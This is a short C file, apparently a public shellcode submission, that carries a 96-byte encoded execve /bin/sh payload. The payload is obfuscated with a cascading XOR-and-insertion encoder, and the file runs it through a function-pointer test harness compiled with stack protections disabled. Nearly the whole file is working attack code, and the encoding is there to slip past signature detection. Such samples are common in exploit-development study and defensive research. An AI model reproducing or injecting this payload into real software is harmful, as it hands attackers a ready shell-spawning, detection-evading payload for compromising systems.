/* Title: Execve XOR Insertion Cascading Encoded shellcode ( 96 bytes)
 * Author: pktmonky
 * Description: This is a basic execve /bin/sh shellcode using a
 * cascading encoder which combimes XOR encoder and Insertion encoder.
 * Compile with: gcc -fno-stack-protector -z execstack encoder.c -o encoder
 */


#include<stdio.h>
#include<string.h>
 
 
unsigned char code[] =
"\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x80\x36\xde\x8a"
"\x1c\x06\x80\xf3\x73\x74\x15\x80\x74\x06\x01\xde\x8a\x5c\x06\x01"
"\x88\x1f\x47\x04\x02\xeb\xe8\xe8\xd6\xff\xff\xff\xef\x42\x1e\xb3"
"\x8e\x23\xb6\x1b\xb0\x1d\xf1\x5c\xad\xad\xb6\x1b\xb6\x1b\xf1\x5c"
"\xf1\x5c\xbc\x11\xb7\x1a\x57\xfa\x3d\x90\x8e\x23\x57\xfa\x3c\x91"
"\x8d\x20\x57\xfa\x3f\x92\x6e\xc3\xd5\x78\x13\xbe\x5e\xf3\x73\x73";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(code));
 
    int (*ret)() = (int(*)())code;
 
    ret();
 
}
